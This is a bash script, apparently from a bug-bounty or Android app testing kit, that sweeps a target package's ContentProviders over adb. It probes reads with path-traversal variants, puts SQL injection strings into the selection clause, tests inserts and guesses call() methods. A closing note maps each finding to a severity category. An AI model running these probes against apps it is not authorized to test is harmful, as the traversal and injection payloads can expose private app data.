#!/usr/bin/env bash
# 03-provider-sweep.sh <pkg>
# ContentProvider read / write / call sweep with traversal and UriMatcher variants.
# read, write and call() are THREE SEPARATE QUESTIONS -- call() is gated by neither
# readPermission nor writePermission.
set -uo pipefail
PKG="${1:?usage: $0 <package>}"

AUTHS=$(adb shell dumpsys package "$PKG" 2>/dev/null \
        | grep -oE '[a-zA-Z0-9._]+\.(provider|providers|fileprovider|FileProvider)[a-zA-Z0-9._]*' \
        | sort -u)
[ -z "$AUTHS" ] && AUTHS=$(adb shell dumpsys package providers 2>/dev/null | grep -oE "${PKG}[a-zA-Z0-9._]*" | sort -u)

echo "[*] authorities discovered:"; echo "$AUTHS" | sed 's/^/     /'
echo

for AUTH in $AUTHS; do
  echo "=============================================================="
  echo " $AUTH"
  echo "=============================================================="
  # --- READ
  for P in "" "/" "//" "/1" "/x" "/.." "/../.." "/%2e%2e%2f" "/..%2f..%2fshared_prefs" ; do
    U="content://$AUTH$P"
    R=$(adb shell content query --uri "$U" 2>&1 | head -2 | tr '\n' ' ')
    case "$R" in
      *SecurityException*)  S="closed (SecurityException)" ;;
      *"does not exist"*|*Unknown*|*"Failed to find"*) S="no such authority/path" ;;
      *Exception*|*Error*)  S="error: $(echo "$R" | cut -c1-70)" ;;
      *)                    S="** READABLE **  $(echo "$R" | cut -c1-70)" ;;
    esac
    printf '  R  %-58s %s\n' "$U" "$S"
  done
  # --- SQL injection probes on the selection argument
  for SEL in "1=1" "1=1) OR (1=1" "' OR '1'='1"; do
    R=$(adb shell content query --uri "content://$AUTH" --where "$SEL" 2>&1 | head -1)
    printf '  Q  where=%-24s %s\n' "$SEL" "$(echo "$R" | cut -c1-70)"
  done
  # --- WRITE (asymmetric permission check)
  R=$(adb shell content insert --uri "content://$AUTH" --bind probe:s:x 2>&1 | head -1)
  printf '  W  %-58s %s\n' "insert" "$(echo "$R" | cut -c1-70)"
  # --- CALL (gated by neither read nor write permission)
  for M in test getInfo get query init config; do
    R=$(adb shell content call --uri "content://$AUTH" --method "$M" 2>&1 | head -1)
    case "$R" in *SecurityException*) : ;; *Bundle*|*result*) printf '  C  call(%-12s) -> %s\n' "$M" "$(echo "$R"|cut -c1-60)";; esac
  done
  echo
done

cat <<'NOTE'
WHAT TO ESCALATE
  ** READABLE ** on a provider that should be private  -> D07, then chase what the rows contain
  traversal path returns data                          -> server_side_injection.file_inclusion.local (VRT P1)
  where= probe changes row count                       -> server_side_injection.sql_injection (VRT P1)
  insert succeeds but read is permission-protected     -> read/write permission asymmetry
  call() succeeds where query() is blocked             -> the classic ungated call() bug
NOTE
